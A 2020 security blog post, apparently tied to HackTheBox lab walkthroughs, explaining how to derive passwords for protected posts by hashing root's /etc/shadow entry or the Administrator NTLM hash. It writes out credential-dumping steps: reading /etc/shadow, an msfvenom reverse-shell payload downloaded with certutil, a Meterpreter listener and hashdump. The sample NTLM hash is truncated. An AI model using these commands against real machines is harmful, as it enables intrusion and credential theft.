---
author: Greenjam94
categories:
- Uncategorized
ct_period_last_updated:
- default
date: "2020-07-06T08:43:30Z"
guid: https://www.hackerunder.dev/?p=890
id: 890
image: /wp-content/uploads/2019/03/abstract-code.jpg
title: Walkthrough Decryption Instructions
url: /walkthrough-decryption-instructions/
---


# 4/9/2022 Update:

> After migrating from WordPress to Hugo, I do not have the ability to password protect blog posts. All content will be public and because of that these decryption instructions are no longer worthwhile for https://hackerunder.dev. I will not be posting content that requires password protection. For example, I previously shared unretired hackthebox machine walkthroughs but required hashes as the password for the post.

This decryption method was copied from [0xPrashant](https://twitter.com/0xprashant) and his own [blog](http://0xprashant.github.io/pages/windows-decryption/). The page may not always be online, so I have copied the walkthrough decryption instructions from [an archived backup](https://web.archive.org/web/20200327224312/https://0xprashant.github.io/pages/decryption-instruction/). Below is a summary of how to create hashes from unique strings in a target machine with either Linux or Windows operating systems.

# Linux Machine Instructions (Using the root user hash in /etc/shadow)

When you own root on a machine you can read the content of /etc/shadow file

Simply run `cat /etc/shadow` and read the contents of the shadow file

```
cat /etc/shadow
root:$6$YIFGN9pFPOS3EmwO$qwICXAw4bqSjjjFaCT1qYscCV72BjFtx/tehbc7sQTJp09UJj9u83eBio1cLcaxyGkx2oDhJsXT6LL0FABlc5.:18277:0:99999:7:::
```


## Create a md5hash from the /etc/shadow entry

Copy whole the line for the root user  
`root:$6$YIFGN9pFPOS3EmwO$qwICXAw4bqSjjjFaCT1qYscCV72BjFtx/tehbc7sQTJp09UJj9u83eBio1cLcaxyGkx2oDhJsXT6LL0FABlc5.:18277:0:99999:7:::`

The following command converts this text to a md5 hash

`echo root:$6$YIFGN9pFPOS3EmwO$qwICXAw4bqSjjjFaCT1qYscCV72BjFtx/tehbc7sQTJp09UJj9u83eBio1cLcaxyGkx2oDhJsXT6LL0FABlc5.:18277:0:99999:7::: | md5sum`

And you get **02bece38cf6510fb40f19e7caa16e323**

This is the password for protected posts of linux machines

# Windows Machine Instructions (Using the Administrator NTLM hash)

When you own a windows machine you are allowed to get the NTLM hashes of all the users

To get the NTLM hash, use a meterpreter shell and the `hashdump` command or an alternative

## Meterpreter hashdump

Assuming you already have access to an Administrator or System level shell

Create a payload that opens a meterpreter shell with msfvenom  
`msfvenom -p windows/meterpreter/reverse_tcp lhost=<YOURIP> lport=4444 -f exe > msf.exe`

Host the payload and download it to the target Windows machine  
Attacker: `python3 -m http.server 80`  
Victim: `certutil -urlcache -split -f http://<YOURIP>/msf.exe c:/windows/temp/msf.exe`

Launch a meterpreter listener

```
kali: msfconsole
msf5> use exploit/multi/handler
msf5> set LHOST <YOURIP>
msf5> run
```

Run the msf.exe file on the victim through your shell

Once a meterpreter session is established, run `hashdump`

If you see the following error  
`[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.`  
List processes with `ps`   
Migrate to a process running as SYSTEM and try again  
`migrate <PID>`  
`hashdump`

## hashdump.exe alternative

WARNING: Hashdump.exe might not give correct NTLM hashes, use another alternative  
Download and transfer [hashdump.exe](https://t.co/qhTz78Jt0S?amp=1) to the windows machine and run it with option /samdump

```
PS C:\tmp> .\hashdump.exe /samdump
SAM hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c:::
```

## Other alternatives

0xPrashant has a post on [getting the NTLM hash](https://0xprashant.github.io/pages/windows-decryption/) from a Windows machine. Besides Meterpreter he also goes over Mimikatz and Secretdump. Any option should work.

## Create a md5hash from the NTLM hash

Copy just the NTLM hash, which is the fourth entry between the colons (:)  
`31d6cfe0d16ae931b73c59d7e0c`

The following command will convert it to a md5 hash

`echo 31d6cfe0d16ae931b73c59d7e0c | md5sum`

Here we got **a8ca0fb8a398cd4268cd5baf75ec29a3**

Paste it in the writeup where it asks for password for decryption of writeup

- - - - - -

Please enjoy the password protected posts after attempting to hack the machines yourself. Use public walkthroughs of retired or older machines if you are new or looking to just follow along. It is a waste of talent to brute force the post password just to follow the steps and not hack a machine by your own ability.

Hopefully these walkthrough decryption instructions are clear and you are able to view protected posts. Feel free to reach out to me or wait for the machines to become retired and I will make the walkthroughs public. 
  
Please comment with questions or suggestions or if a machine guide is incorrect.

If a walkthrough is violating a lab’s Terms of Service or needs to be removed, please reach out to me as well at [HackerUnderDev](https://twitter.com/hackerunderdev) on Twitter.